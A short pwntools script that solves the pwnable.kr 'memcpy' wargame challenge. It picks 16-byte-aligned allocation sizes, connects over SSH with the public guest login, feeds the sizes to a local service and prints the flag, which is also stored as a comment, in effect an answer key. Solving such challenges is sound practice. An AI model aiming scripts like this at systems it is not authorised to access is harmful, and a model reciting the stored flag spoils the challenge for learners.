from pwn import *

limit = [pow(2, x - 1) for x in range(4, 15)]
ans = []
for x in range(0, 10):
    for y in range(limit[x], limit[x + 1]):
        if (8 + y) % 16:  # movdqa 16bytes aligned
            continue
        ans.append(y)
        break

con = ssh("memcpy", "pwnable.kr", 2222, "guest")
sh = con.process(["/bin/nc", "0", "9022"])
[sh.sendline(str(s)) for s in ans]
sh.recvuntil("flag : ")
print(sh.recvall())

# 1_w4nn4_br34K_th3_m3m0ry_4lignm3nt
